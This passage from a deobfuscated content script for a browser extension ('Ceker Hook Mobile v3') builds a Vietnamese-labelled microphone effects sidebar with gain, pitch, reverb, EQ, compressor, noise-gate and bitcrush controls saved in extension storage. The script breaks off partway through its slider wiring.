// Author: tdinh
// Decoded by: tdinh cute
// Target: content.js (Ceker Hook Mobile v3 - Chrome/Kiwi Extension)
// Status: Fully deobfuscated & Defanged

(function () {
  'use strict';

  let _0xcb1a96 = 1;
  let _0x551509 = 0;
  let _0xd6b4cf = 0;
  let _0x3d2a8b = 0;
  let _0x4c7b01 = 1;
  let _0x15b60a = -20;
  let _0x55e900 = 4;
  let _0x449dc1 = 0;
  let _0x42cb61 = 0;
  let _0x5dec06 = 0;
  let _0x8ee744 = 0;
  let _0xe82781 = 80;
  let _0x16dc45 = 0;
  let _0x202a19 = false;
  let _0x4a7be5 = false;
  let _0x2c414f = false;
  let _0x453043 = false;
  let _0x116c5d = 0.003;
  let _0x52441f = 400;
  let _0x5877dc = false;
  let _0x2ed8d3 = 8;
  let _0x31fbaa = 4;
  let _0x1c1b2a = false;
  let _0x304527 = 0;
  chrome.storage.local.get(["micGain", "micPitch", "micPan", "micReverb", "masterVol", "compThreshold", "compRatio", "compGain", "eqBass", "eqMid", "eqTreble", "micHighpass", "micPresence", "noiseGateEnabled", "feedbackNotchEnabled", "noiseThreshold", "notchFrequency", "bitcrushEnabled", "bitcrushBits", "bitcrushRate", "x2BoostEnabled", "sidebarX", "sidebarY"], _0x2035f5 => {
    if (_0x2035f5.micGain !== undefined) {
      _0xcb1a96 = _0x2035f5.micGain;
    }
    if (_0x2035f5.micPitch !== undefined) {
      _0x551509 = _0x2035f5.micPitch;
    }
    if (_0x2035f5.micPan !== undefined) {
      _0xd6b4cf = _0x2035f5.micPan;
    }
    if (_0x2035f5.micReverb !== undefined) {
      _0x3d2a8b = _0x2035f5.micReverb;
    }
    if (_0x2035f5.masterVol !== undefined) {
      _0x4c7b01 = _0x2035f5.masterVol;
    }
    if (_0x2035f5.compThreshold !== undefined) {
      _0x15b60a = _0x2035f5.compThreshold;
    }
    if (_0x2035f5.compRatio !== undefined) {
      _0x55e900 = _0x2035f5.compRatio;
    }
    if (_0x2035f5.compGain !== undefined) {
      _0x449dc1 = _0x2035f5.compGain;
    }
    if (_0x2035f5.eqBass !== undefined) {
      _0x42cb61 = _0x2035f5.eqBass;
    }
    if (_0x2035f5.eqMid !== undefined) {
      _0x5dec06 = _0x2035f5.eqMid;
    }
    if (_0x2035f5.eqTreble !== undefined) {
      _0x8ee744 = _0x2035f5.eqTreble;
    }
    if (_0x2035f5.micHighpass !== undefined) {
      _0xe82781 = _0x2035f5.micHighpass;
    }
    if (_0x2035f5.micPresence !== undefined) {
      _0x16dc45 = _0x2035f5.micPresence;
    }
    if (_0x2035f5.noiseGateEnabled !== undefined) {
      _0x2c414f = _0x2035f5.noiseGateEnabled;
    }
    if (_0x2035f5.feedbackNotchEnabled !== undefined) {
      _0x453043 = _0x2035f5.feedbackNotchEnabled;
    }
    if (_0x2035f5.noiseThreshold !== undefined) {
      _0x116c5d = _0x2035f5.noiseThreshold;
    }
    if (_0x2035f5.notchFrequency !== undefined) {
      _0x52441f = _0x2035f5.notchFrequency;
    }
    if (_0x2035f5.bitcrushEnabled !== undefined) {
      _0x5877dc = _0x2035f5.bitcrushEnabled;
    }
    if (_0x2035f5.bitcrushBits !== undefined) {
      _0x2ed8d3 = _0x2035f5.bitcrushBits;
    }
    if (_0x2035f5.bitcrushRate !== undefined) {
      _0x31fbaa = _0x2035f5.bitcrushRate;
    }
    if (_0x2035f5.x2BoostEnabled !== undefined) {
      _0x1c1b2a = _0x2035f5.x2BoostEnabled;
    }
    window._midnightPos = {
      x: _0x2035f5.sidebarX || 80,
      y: _0x2035f5.sidebarY || 60
    };
  });
  window.addEventListener("__midnight_mic_statusResponse", _0x5e3f3e => {
    const _0x497626 = _0x5e3f3e.detail;
    _0x202a19 = _0x497626.active;
    if (_0x497626.currentGain !== undefined) {
      _0xcb1a96 = _0x497626.currentGain;
    }
    if (_0x497626.currentPitch !== undefined) {
      _0x551509 = _0x497626.currentPitch;
    }
    if (_0x497626.currentPan !== undefined) {
      _0xd6b4cf = _0x497626.currentPan;
    }
    if (_0x497626.currentReverb !== undefined) {
      _0x3d2a8b = _0x497626.currentReverb;
    }
    if (_0x497626.masterVol !== undefined) {
      _0x4c7b01 = _0x497626.masterVol;
    }
    if (_0x497626.compThreshold !== undefined) {
      _0x15b60a = _0x497626.compThreshold;
    }
    if (_0x497626.compRatio !== undefined) {
      _0x55e900 = _0x497626.compRatio;
    }
    if (_0x497626.compGain !== undefined) {
      _0x449dc1 = _0x497626.compGain;
    }
    if (_0x497626.eqBass !== undefined) {
      _0x42cb61 = _0x497626.eqBass;
    }
    if (_0x497626.eqMid !== undefined) {
      _0x5dec06 = _0x497626.eqMid;
    }
    if (_0x497626.eqTreble !== undefined) {
      _0x8ee744 = _0x497626.eqTreble;
    }
    if (_0x497626.highpass !== undefined) {
      _0xe82781 = _0x497626.highpass;
    }
    if (_0x497626.presence !== undefined) {
      _0x16dc45 = _0x497626.presence;
    }
    if (_0x497626.noiseGateEnabled !== undefined) {
      _0x2c414f = _0x497626.noiseGateEnabled;
    }
    if (_0x497626.feedbackNotchEnabled !== undefined) {
      _0x453043 = _0x497626.feedbackNotchEnabled;
    }
    if (_0x497626.noiseThreshold !== undefined) {
      _0x116c5d = _0x497626.noiseThreshold;
    }
    if (_0x497626.notchFrequency !== undefined) {
      _0x52441f = _0x497626.notchFrequency;
    }
    if (_0x497626.bitcrushEnabled !== undefined) {
      _0x5877dc = _0x497626.bitcrushEnabled;
    }
    if (_0x497626.bitcrushBits !== undefined) {
      _0x2ed8d3 = _0x497626.bitcrushBits;
    }
    if (_0x497626.bitcrushRate !== undefined) {
      _0x31fbaa = _0x497626.bitcrushRate;
    }
    if (_0x497626.x2BoostEnabled !== undefined) {
      _0x1c1b2a = _0x497626.x2BoostEnabled;
    }
    _0x3259c4();
    _0x21d88e();
    _0x26e280();
    _0x4596ca();
    _0x5ca8bd();
  });
  window.addEventListener("__midnight_mic_meterData", _0xc39f41 => {
    _0x304527 = _0xc39f41.detail.value || 0;
    _0x1baf40();
  });
  window.addEventListener("__midnight_mic_gainChanged", _0x20a998 => {
    _0xcb1a96 = _0x20a998.detail.currentGain;
    _0x104bcf();
  });
  window.addEventListener("__midnight_mic_pitchChanged", _0x1faffb => {
    _0x551509 = _0x1faffb.detail.currentPitch;
    _0xd7c543();
  });
  window.addEventListener("__midnight_mic_panChanged", _0x5c5906 => {
    _0xd6b4cf = _0x5c5906.detail.currentPan;
    _0x23e84f();
  });
  window.addEventListener("__midnight_mic_reverbChanged", _0x1a9b80 => {
    _0x3d2a8b = _0x1a9b80.detail.currentReverb;
    _0x4e2894();
  });
  window.addEventListener("__midnight_mic_masterVolChanged", _0x14d94c => {
    _0x4c7b01 = _0x14d94c.detail.value;
    _0x32b288();
  });
  window.addEventListener("__midnight_mic_compChanged", _0x10be79 => {
    _0x15b60a = _0x10be79.detail.threshold;
    _0x55e900 = _0x10be79.detail.ratio;
    _0x449dc1 = _0x10be79.detail.gain;
    _0x45b2d2();
  });
  window.addEventListener("__midnight_mic_eqChanged", _0x18b938 => {
    _0x42cb61 = _0x18b938.detail.bass;
    if (_0x18b938.detail.mid !== undefined) {
      _0x5dec06 = _0x18b938.detail.mid;
    }
    _0x8ee744 = _0x18b938.detail.treble;
    _0x19afa3();
  });
  window.addEventListener("__midnight_mic_highpassChanged", _0xb05c64 => {
    _0xe82781 = _0xb05c64.detail.freq;
    _0x213d18();
  });
  window.addEventListener("__midnight_mic_presenceChanged", _0x47e121 => {
    _0x16dc45 = _0x47e121.detail.gain;
    _0x213d18();
  });
  window.addEventListener("__midnight_mic_noiseGateChanged", _0x3f34f4 => {
    _0x2c414f = _0x3f34f4.detail.enabled;
    _0x116c5d = _0x3f34f4.detail.threshold;
    _0x26e280();
  });
  window.addEventListener("__midnight_mic_feedbackNotchChanged", _0x508b1e => {
    _0x453043 = _0x508b1e.detail.enabled;
    _0x52441f = _0x508b1e.detail.frequency;
    _0x26e280();
  });
  window.addEventListener("__midnight_mic_bitcrushChanged", _0x34e94c => {
    _0x5877dc = _0x34e94c.detail.enabled;
    _0x2ed8d3 = _0x34e94c.detail.bits;
    _0x31fbaa = _0x34e94c.detail.rate;
    _0x4596ca();
  });
  window.addEventListener("__midnight_mic_x2BoostChanged", _0xc9102 => {
    _0x1c1b2a = _0xc9102.detail.enabled;
    _0x5ca8bd();
  });
  const _0x4fcf40 = (_0x55b092, _0x5387a0) => window.dispatchEvent(new CustomEvent(_0x55b092, {
    detail: _0x5387a0
  }));
  const _0x4057d2 = _0x4eb2e1 => {
    _0x4fcf40("__midnight_mic_setGain", {
      value: _0x4eb2e1
    });
    chrome.storage.local.set({
      micGain: _0x4eb2e1
    });
  };
  const _0x3b1694 = _0x94bf35 => {
    _0x4fcf40("__midnight_mic_setPitch", {
      value: _0x94bf35
    });
    chrome.storage.local.set({
      micPitch: _0x94bf35
    });
  };
  const _0x5bf675 = _0x2668c1 => {
    _0x4fcf40("__midnight_mic_setPan", {
      value: _0x2668c1
    });
    chrome.storage.local.set({
      micPan: _0x2668c1
    });
  };
  const _0x164d62 = _0x3dab6b => {
    _0x4fcf40("__midnight_mic_setReverb", {
      value: _0x3dab6b
    });
    chrome.storage.local.set({
      micReverb: _0x3dab6b
    });
  };
  const _0xf981a = _0x32e7cd => {
    _0x4fcf40("__midnight_mic_setMasterVol", {
      value: _0x32e7cd
    });
    chrome.storage.local.set({
      masterVol: _0x32e7cd
    });
  };
  const _0x198507 = (_0x5bcde8, _0x2f2a69, _0xa5afd6) => {
    _0x4fcf40("__midnight_mic_setComp", {
      threshold: _0x5bcde8,
      ratio: _0x2f2a69,
      gain: _0xa5afd6
    });
    chrome.storage.local.set({
      compThreshold: _0x5bcde8,
      compRatio: _0x2f2a69,
      compGain: _0xa5afd6
    });
  };
  const _0x5b05b1 = (_0x44a670, _0x3f848e, _0x2e9b1b) => {
    _0x4fcf40("__midnight_mic_setEq", {
      bass: _0x44a670,
      mid: _0x3f848e,
      treble: _0x2e9b1b
    });
    chrome.storage.local.set({
      eqBass: _0x44a670,
      eqMid: _0x3f848e,
      eqTreble: _0x2e9b1b
    });
  };
  const _0x55dc60 = _0x408037 => {
    _0x4fcf40("__midnight_mic_setHighpass", {
      freq: _0x408037
    });
    chrome.storage.local.set({
      micHighpass: _0x408037
    });
  };
  const _0x1d262a = _0x4473de => {
    _0x4fcf40("__midnight_mic_setPresence", {
      gain: _0x4473de
    });
    chrome.storage.local.set({
      micPresence: _0x4473de
    });
  };
  const _0x4d9af6 = (_0x43acc6, _0x55c759) => {
    _0x4fcf40("__midnight_mic_setNoiseGate", {
      enabled: _0x43acc6,
      threshold: _0x55c759
    });
    chrome.storage.local.set({
      noiseGateEnabled: _0x43acc6,
      noiseThreshold: _0x55c759
    });
  };
  const _0x2180af = (_0x11785f, _0x383bdc) => {
    _0x4fcf40("__midnight_mic_setFeedbackNotch", {
      enabled: _0x11785f,
      frequency: _0x383bdc
    });
    chrome.storage.local.set({
      feedbackNotchEnabled: _0x11785f,
      notchFrequency: _0x383bdc
    });
  };
  const _0x584482 = (_0x4ae259, _0x7f7c17, _0x3928bb) => {
    _0x4fcf40("__midnight_mic_setBitcrush", {
      enabled: _0x4ae259,
      bits: _0x7f7c17,
      rate: _0x3928bb
    });
    chrome.storage.local.set({
      bitcrushEnabled: _0x4ae259,
      bitcrushBits: _0x7f7c17,
      bitcrushRate: _0x3928bb
    });
  };
  const _0xd8175b = _0x40bb34 => {
    _0x4fcf40("__midnight_mic_setX2Boost", {
      enabled: _0x40bb34
    });
    chrome.storage.local.set({
      x2BoostEnabled: _0x40bb34
    });
  };
  const _0x40cc4d = () => _0x4fcf40("__midnight_mic_getStatus", {});
  function _0x3614a5() {
    if (document.getElementById("midnight-mic-sidebar")) {
      return;
    }
    const _0x3593be = document.createElement("div");
    _0x3593be.id = "midnight-mic-sidebar";
    _0x3593be.className = "midnight-hidden";
    if (window._midnightPos) {
      _0x3593be.style.left = window._midnightPos.x + "px";
      _0x3593be.style.top = window._midnightPos.y + "px";
      _0x3593be.style.right = "auto";
    }
    _0x3593be.innerHTML = "\n      <div class=\"midnight-drag-handle\" id=\"midnight-drag-handle\">\n        <div class=\"midnight-title\">\n          <svg viewBox=\"0 0 24 24\"><path d=\"M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z\"/><path d=\"M19 10v2a7 7 0 0 1-14 0v-2\"/><line x1=\"12\" y1=\"19\" x2=\"12\" y2=\"23\"/><line x1=\"8\" y1=\"23\" x2=\"16\" y2=\"23\"/></svg>\n          Ceker\n        </div>\n        <div class=\"midnight-status-group\">\n          <span class=\"midnight-status-dot\" id=\"midnight-status-dot\"></span>\n          <span id=\"midnight-status-text\">Wait</span>\n          <span class=\"midnight-meter-db\" id=\"midnight-meter-db\">-∞</span>\n        </div>\n        <button class=\"midnight-close-btn\" id=\"midnight-close\">×</button>\n      </div>\n\n      <div class=\"midnight-meter\"><div class=\"midnight-meter-fill\" id=\"midnight-meter-fill\"></div></div>\n\n      <div class=\"midnight-tabs\">\n        <button class=\"midnight-tab active\" data-tab=\"gain\">GAIN</button>\n        <button class=\"midnight-tab\" data-tab=\"fx\">FX</button>\n        <button class=\"midnight-tab\" data-tab=\"clean\">CLEAN</button>\n        <button class=\"midnight-tab\" data-tab=\"bg\">SET</button>\n      </div>\n\n      <div class=\"midnight-panels\">\n        <!-- GAIN -->\n        <div class=\"midnight-panel active\" data-panel=\"gain\">\n          <div class=\"midnight-gain-hero\">\n            <div class=\"midnight-gain-big\" id=\"midnight-gain-value\">1.0×</div>\n            <div class=\"midnight-gain-unit\">MIC GAIN</div>\n          </div>\n          <div class=\"midnight-slider-container\">\n            <input type=\"range\" id=\"midnight-slider\" class=\"midnight-slider\" min=\"0\" max=\"10000\" step=\"1\" value=\"0\"/>\n            <div class=\"midnight-slider-track\" id=\"midnight-slider-track\"></div>\n          </div>\n          <div class=\"midnight-preset-grid\" id=\"gain-presets\"></div>\n          <div class=\"midnight-divider\"></div>\n          <button class=\"midnight-preset big midnight-boost-btn\" id=\"midnight-x2-boost\">X2 BOOST MIC</button>\n          <div class=\"midnight-divider\"></div>\n          <div class=\"midnight-row\">\n            <span class=\"midnight-label\">Master</span>\n            <span class=\"midnight-value\" id=\"midnight-master-value\">1.0×</span>\n          </div>\n          <div class=\"midnight-slider-container\">\n            <input type=\"range\" id=\"midnight-master-slider\" class=\"midnight-slider\" min=\"0\" max=\"1000\" step=\"1\" value=\"0\"/>\n            <div class=\"midnight-slider-track\" id=\"midnight-master-track\"></div>\n          </div>\n        </div>\n\n        <!-- FX -->\n        <div class=\"midnight-panel\" data-panel=\"fx\">\n          <div class=\"midnight-row\">\n            <span class=\"midnight-label\">Reverb (Vang)</span>\n            <span class=\"midnight-value\" id=\"midnight-reverb-value\">0%</span>\n          </div>\n          <div class=\"midnight-slider-container\">\n            <input type=\"range\" id=\"midnight-reverb-slider\" class=\"midnight-slider\" min=\"0\" max=\"200\" step=\"1\" value=\"0\"/>\n            <div class=\"midnight-slider-track\" id=\"midnight-reverb-track\"></div>\n          </div>\n          <div class=\"midnight-preset-grid\" id=\"reverb-presets\"></div>\n          <div class=\"midnight-divider\"></div>\n          <div class=\"midnight-row\">\n            <span class=\"midnight-label\">Pitch</span>\n            <span class=\"midnight-value\" id=\"midnight-pitch-value\">0</span>\n          </div>\n          <div class=\"midnight-slider-container\">\n            <input type=\"range\" id=\"midnight-pitch-slider\" class=\"midnight-slider\" min=\"-10\" max=\"10\" step=\"0.5\" value=\"0\"/>\n            <div class=\"midnight-slider-track\" id=\"midnight-pitch-track\"></div>\n          </div>\n          <div class=\"midnight-preset-grid\" id=\"pitch-presets\"></div>\n          <div class=\"midnight-divider\"></div>\n          <div class=\"midnight-row\">\n            <span class=\"midnight-label\">Pan</span>\n            <span class=\"midnight-value\" id=\"midnight-pan-value\">C</span>\n          </div>\n          <div class=\"midnight-slider-container\">\n            <input type=\"range\" id=\"midnight-pan-slider\" class=\"midnight-slider\" min=\"-100\" max=\"100\" step=\"1\" value=\"0\"/>\n            <div class=\"midnight-slider-track\" id=\"midnight-pan-track\"></div>\n          </div>\n          <div class=\"midnight-divider\"></div>\n          <div class=\"midnight-toggle-row\">\n            <label class=\"midnight-toggle\"><input type=\"checkbox\" id=\"midnight-bitcrush-toggle\"/>Bitcrush</label>\n          </div>\n          <div class=\"midnight-row\">\n            <span class=\"midnight-label\">Crush Bits</span>\n            <span class=\"midnight-value\" id=\"midnight-bits-value\">8</span>\n          </div>\n          <div class=\"midnight-slider-container\">\n            <input type=\"range\" id=\"midnight-bits-slider\" class=\"midnight-slider\" min=\"1\" max=\"16\" step=\"1\" value=\"8\"/>\n            <div class=\"midnight-slider-track\" id=\"midnight-bits-track\"></div>\n          </div>\n          <div class=\"midnight-row\">\n            <span class=\"midnight-label\">Crush Rate</span>\n            <span class=\"midnight-value\" id=\"midnight-crushrate-value\">4×</span>\n          </div>\n          <div class=\"midnight-slider-container\">\n            <input type=\"range\" id=\"midnight-crushrate-slider\" class=\"midnight-slider\" min=\"1\" max=\"32\" step=\"1\" value=\"4\"/>\n            <div class=\"midnight-slider-track\" id=\"midnight-crushrate-track\"></div>\n          </div>\n          <div class=\"midnight-preset-grid wide\" id=\"crush-presets\"></div>\n        </div>\n\n        <!-- CLEAN -->\n        <div class=\"midnight-panel\" data-panel=\"clean\">\n          <div class=\"midnight-toggle-row\">\n            <label class=\"midnight-toggle\"><input type=\"checkbox\" id=\"midnight-noise-gate\"/>Gate</label>\n            <label class=\"midnight-toggle\"><input type=\"checkbox\" id=\"midnight-feedback-notch\"/>Notch</label>\n          </div>\n\n          <div class=\"midnight-row\">\n            <span class=\"midnight-label\">Lọc tạp âm (High-pass)</span>\n            <span class=\"midnight-value\" id=\"midnight-highpass-value\">80Hz</span>\n          </div>\n          <div class=\"midnight-slider-container\">\n            <input type=\"range\" id=\"midnight-highpass-slider\" class=\"midnight-slider\" min=\"20\" max=\"400\" step=\"5\" value=\"80\"/>\n            <div class=\"midnight-slider-track\" id=\"midnight-highpass-track\"></div>\n          </div>\n\n          <div class=\"midnight-row\">\n            <span class=\"midnight-label\">Giọng cao (Presence 3.5k)</span>\n            <span class=\"midnight-value\" id=\"midnight-presence-value\">0dB</span>\n          </div>\n          <div class=\"midnight-slider-container\">\n            <input type=\"range\" id=\"midnight-presence-slider\" class=\"midnight-slider\" min=\"-6\" max=\"12\" step=\"0.5\" value=\"0\"/>\n            <div class=\"midnight-slider-track\" id=\"midnight-presence-track\"></div>\n          </div>\n\n          <div class=\"midnight-row\">\n            <span class=\"midnight-label\">Gate Threshold</span>\n            <span class=\"midnight-value\" id=\"midnight-noise-threshold-value\">0.003</span>\n          </div>\n          <div class=\"midnight-slider-container\">\n            <input type=\"range\" id=\"midnight-noise-threshold\" class=\"midnight-slider\" min=\"0\" max=\"0.05\" step=\"0.001\" value=\"0.003\"/>\n            <div class=\"midnight-slider-track\" id=\"midnight-gate-thresh-track\"></div>\n          </div>\n\n          <div class=\"midnight-row\">\n            <span class=\"midnight-label\">Notch Freq</span>\n            <span class=\"midnight-value\" id=\"midnight-notch-freq-value\">400</span>\n          </div>\n          <div class=\"midnight-slider-container\">\n            <input type=\"range\" id=\"midnight-notch-freq\" class=\"midnight-slider\" min=\"100\" max=\"2000\" step=\"10\" value=\"400\"/>\n            <div class=\"midnight-slider-track\" id=\"midnight-notch-freq-track\"></div>\n          </div>\n\n          <div class=\"midnight-divider\"></div>\n          <div class=\"midnight-preset-grid wide\" id=\"vocal-presets\"></div>\n        </div>\n\n        <!-- SET -->\n        <div class=\"midnight-panel\" data-panel=\"bg\">\n          <div class=\"midnight-bg-upload\">\n            <label class=\"midnight-upload-btn\" for=\"midnight-bg-input\">📷 Background</label>\n            <input type=\"file\" id=\"midnight-bg-input\" accept=\"image/*\" style=\"display:none\"/>\n            <button class=\"midnight-bg-reset\" id=\"midnight-bg-reset\">✕</button>\n          </div>\n          <div class=\"midnight-bg-preview\" id=\"midnight-bg-preview\"></div>\n          <div class=\"midnight-divider\"></div>\n          <div class=\"midnight-row\">\n            <span class=\"midnight-label\">Compressor</span>\n            <span class=\"midnight-value\" id=\"midnight-comp-ratio\">4:1</span>\n          </div>\n          <div class=\"midnight-slider-container\">\n            <input type=\"range\" id=\"midnight-comp-ratio-slider\" class=\"midnight-slider\" min=\"1\" max=\"20\" step=\"0.5\" value=\"4\"/>\n            <div class=\"midnight-slider-track\" id=\"midnight-comp-ratio-track\"></div>\n          </div>\n          <div class=\"midnight-divider\"></div>\n          <div class=\"midnight-row\">\n            <span class=\"midnight-label\">Bass (200Hz)</span>\n            <span class=\"midnight-value\" id=\"midnight-eq-bass\">0dB</span>\n          </div>\n          <div class=\"midnight-slider-container\">\n            <input type=\"range\" id=\"midnight-eq-bass-slider\" class=\"midnight-slider\" min=\"-24\" max=\"24\" step=\"1\" value=\"0\"/>\n            <div class=\"midnight-slider-track\" id=\"midnight-eq-bass-track\"></div>\n          </div>\n          <div class=\"midnight-row\">\n            <span class=\"midnight-label\">Mid (1kHz)</span>\n            <span class=\"midnight-value\" id=\"midnight-eq-mid\">0dB</span>\n          </div>\n          <div class=\"midnight-slider-container\">\n            <input type=\"range\" id=\"midnight-eq-mid-slider\" class=\"midnight-slider\" min=\"-24\" max=\"24\" step=\"1\" value=\"0\"/>\n            <div class=\"midnight-slider-track\" id=\"midnight-eq-mid-track\"></div>\n          </div>\n          <div class=\"midnight-row\">\n            <span class=\"midnight-label\">Treble (4kHz)</span>\n            <span class=\"midnight-value\" id=\"midnight-eq-treble\">0dB</span>\n          </div>\n          <div class=\"midnight-slider-container\">\n            <input type=\"range\" id=\"midnight-eq-treble-slider\" class=\"midnight-slider\" min=\"-24\" max=\"24\" step=\"1\" value=\"0\"/>\n            <div class=\"midnight-slider-track\" id=\"midnight-eq-treble-track\"></div>\n          </div>\n          <div class=\"midnight-preset-grid wide\" id=\"eq-presets\"></div>\n          <div class=\"midnight-hint\">Ceker V4 · 320×240 · 4:3</div>\n        </div>\n      </div>\n    ";
    document.body.appendChild(_0x3593be);
    const _0x2e59f2 = [1, 2, 5, 10, 25, 50, 100, 250, 500, 1000, 2000, 5000, 10000, 20000, 50000, 100000];
    const _0x1215fc = document.getElementById("gain-presets");
    _0x2e59f2.forEach(_0x5472ff => {
      const _0x2daa1c = document.createElement("button");
      _0x2daa1c.className = "midnight-preset";
      _0x2daa1c.textContent = _0x5472ff >= 1000 ? _0x5472ff / 1000 + "k×" : _0x5472ff + "×";
      _0x2daa1c.dataset.gain = _0x5472ff;
      _0x1215fc.appendChild(_0x2daa1c);
    });
    const _0x3f4d3b = [-10, -5, -3, -1, 0, 1, 3, 5, 10];
    const _0x1eeea3 = document.getElementById("pitch-presets");
    _0x3f4d3b.forEach(_0x269dfc => {
      const _0x4edd34 = document.createElement("button");
      _0x4edd34.className = "midnight-preset";
      _0x4edd34.textContent = _0x269dfc > 0 ? "+" + _0x269dfc : _0x269dfc;
      _0x4edd34.dataset.pitch = _0x269dfc;
      _0x1eeea3.appendChild(_0x4edd34);
    });
    const _0x307644 = [0, 0.15, 0.3, 0.5, 0.8, 1.2];
    const _0xf621e5 = document.getElementById("reverb-presets");
    _0x307644.forEach(_0x128623 => {
      const _0x4bd95e = document.createElement("button");
      _0x4bd95e.className = "midnight-preset";
      _0x4bd95e.textContent = _0x128623 === 0 ? "Dry" : Math.round(_0x128623 * 100) + "%";
      _0x4bd95e.dataset.reverb = _0x128623;
      _0xf621e5.appendChild(_0x4bd95e);
    });
    const _0x3b93c4 = [{
      name: "Lo-Fi",
      bits: 8,
      rate: 4
    }, {
      name: "Radio",
      bits: 5,
      rate: 6
    }, {
      name: "Robot",
      bits: 4,
      rate: 12
    }, {
      name: "Crush",
      bits: 3,
      rate: 20
    }];
    const _0x28452d = document.getElementById("crush-presets");
    _0x3b93c4.forEach(_0x1632d5 => {
      const _0x35260f = document.createElement("button");
      _0x35260f.className = "midnight-preset big";
      _0x35260f.textContent = _0x1632d5.name;
      _0x35260f.addEventListener("click", () => {
        _0x5877dc = true;
        _0x2ed8d3 = _0x1632d5.bits;
        _0x31fbaa = _0x1632d5.rate;
        _0x584482(true, _0x1632d5.bits, _0x1632d5.rate);
        _0x4596ca();
      });
      _0x28452d.appendChild(_0x35260f);
    });
    const _0x522599 = [{
      name: "VOCAL",
      bass: -3,
      mid: 2,
      treble: 4
    }, {
      name: "BASS",
      bass: 8,
      mid: -2,
      treble: -2
    }, {
      name: "FLAT",
      bass: 0,
      mid: 0,
      treble: 0
    }, {
      name: "CINEMA",
      bass: 10,
      mid: -3,
      treble: 6
    }];
    const _0x5e49f6 = document.getElementById("eq-presets");
    _0x522599.forEach(_0x20525c => {
      const _0x75fa3c = document.createElement("button");
      _0x75fa3c.className = "midnight-preset big";
      _0x75fa3c.textContent = _0x20525c.name;
      _0x75fa3c.addEventListener("click", () => {
        _0x42cb61 = _0x20525c.bass;
        _0x5dec06 = _0x20525c.mid;
        _0x8ee744 = _0x20525c.treble;
        _0x5b05b1(_0x20525c.bass, _0x20525c.mid, _0x20525c.treble);
        _0x19afa3();
      });
      _0x5e49f6.appendChild(_0x75fa3c);
    });
    const _0x1968c2 = document.getElementById("vocal-presets");
    const _0x32aaed = [{
      name: "VANG TO",
      action: () => {
        _0x3d2a8b = 0.75;
        _0x16dc45 = 3;
        _0x164d62(_0x3d2a8b);
        _0x1d262a(_0x16dc45);
        _0x4e2894();
        _0x213d18();
      }
    }, {
      name: "TRONG RÕ",
      action: () => {
        _0x2c414f = true;
        _0x116c5d = 0.005;
        _0x453043 = true;
        _0x52441f = 400;
        _0xe82781 = 120;
        _0x16dc45 = 4;
        _0x15b60a = -22;
        _0x55e900 = 4;
        _0x449dc1 = 3;
        _0x4d9af6(_0x2c414f, _0x116c5d);
        _0x2180af(_0x453043, _0x52441f);
        _0x55dc60(_0xe82781);
        _0x1d262a(_0x16dc45);
        _0x198507(_0x15b60a, _0x55e900, _0x449dc1);
        _0x213d18();
        _0x26e280();
        _0x45b2d2();
      }
    }, {
      name: "GIỌNG CAO",
      action: () => {
        _0x551509 = 3;
        _0x16dc45 = 5;
        _0x42cb61 = -3;
        _0x5dec06 = 1;
        _0x8ee744 = 4;
        _0x3b1694(_0x551509);
        _0x1d262a(_0x16dc45);
        _0x5b05b1(_0x42cb61, _0x5dec06, _0x8ee744);
        _0xd7c543();
        _0x213d18();
        _0x19afa3();
      }
    }, {
      name: "CLEAN MIC",
      action: () => {
        _0x2c414f = true;
        _0x116c5d = 0.004;
        _0xe82781 = 100;
        _0x15b60a = -24;
        _0x55e900 = 4;
        _0x449dc1 = 2;
        _0x4d9af6(_0x2c414f, _0x116c5d);
        _0x55dc60(_0xe82781);
        _0x198507(_0x15b60a, _0x55e900, _0x449dc1);
        _0x213d18();
        _0x26e280();
        _0x45b2d2();
      }
    }];
    _0x32aaed.forEach(_0x53411c => {
      const _0x2996b9 = document.createElement("button");
      _0x2996b9.className = "midnight-preset big";
      _0x2996b9.textContent = _0x53411c.name;
      _0x2996b9.addEventListener("click", _0x53411c.action);
      _0x1968c2.appendChild(_0x2996b9);
    });
    const _0x437e40 = document.getElementById("midnight-slider");
    const _0x4c317f = document.getElementById("midnight-pitch-slider");
    const _0x54cd58 = document.getElementById("midnight-pan-slider");
    const _0x4ed9a0 = document.getElementById("midnight-reverb-slider");
    const _0x4d01ac = document.getElementById("midnight-master-slider");
    const _0x3d940e = document.getElementById("midnight-comp-ratio-slider");
    const _0x46053e = document.getElementById("midnight-eq-bass-slider");
    const _0x1fd3ed = document.getElementById("midnight-eq-mid-slider");
    const _0x1fd3d7 = document.getElementById("midnight-eq-treble-slider");
    const _0x424b4d = document.getElementById("midnight-highpass-slider");
    const _0x498085 = document.getElementById("midnight-presence-slider");
    const _0x4747c8 = document.getElementById("midnight-noise-gate");
    const _0x129190 = document.getElementById("midnight-feedback-notch");
    const _0x1b8734 = document.getElementById("midnight-noise-threshold");
    const _0x39eb94 = document.getElementById("midnight-notch-freq");
    const _0x2d3a11 = document.getElementById("midnight-bitcrush-toggle");
    const _0xa4f915 = document.getElementById("midnight-bits-slider");
    const _0x594b27 = document.getElementById("midnight-crushrate-slider");
    const _0x54b7c2 = document.getElementById("midnight-x2-boost");
    const _0x50cc45 = _0x29666a => Math.pow(10, _0x29666a / 10000 * 5);
    const _0x46387e = _0x229eb2 => Math.log10(Math.max(1, _0x229eb2)) / 5 * 10000;
    const _0x1b27ff = _0x32d4b8 => Math.pow(10, _0x32d4b8 / 1000 * 3);
    const _0x3c7f18 = _0x15d477 => Math.log10(Math.max(0.1, _0x15d477)) / 3 * 1000;
    _0x437e40.addEventListener("input", () => {
      _0xcb1a96 = _0x50cc45(parseFloat(_0x437e40.value));
      _0x104bcf();
      _0x4057d2(_0xcb1a96);
    });
    _0x4c317f.addEventListener("input", () => {
      _0x551509 = parseFloat(_0x4c317f.value);
      _0xd7c543();
      _0x3b1694(_0x551509);
    });
    _0x54cd58.addEventListener("input", () => {
      _0xd6b4cf = parseFloat(_0x54cd58.value) / 100;
      _0x23e84f();
      _0x5bf675(_0xd6b4cf);
    });
    _0x4ed9a0.addEventListener("input", () => {
      _0x3d2a8b = parseFloat(_0x4ed9a0.value) / 100;
      _0x4e2894();
      _0x164d62(_0x3d2a8b);
    });
    _0x4d01ac.addEventListener("input", () => {
      _0x4c7b01 = _0x1b27ff(parseFloat(_0x4d01ac.value));
      _0x32b288();
      _0xf981a(_0x4c7b01);
    });
    _0x3d940e.addEventListener("input", () => {
      _0x55e900 = parseFloat(_0x3d940e.value);
      _0x45b2d2();
      _0x198507(_0x15b60a, _0x55e900, _0x449dc1);
    });
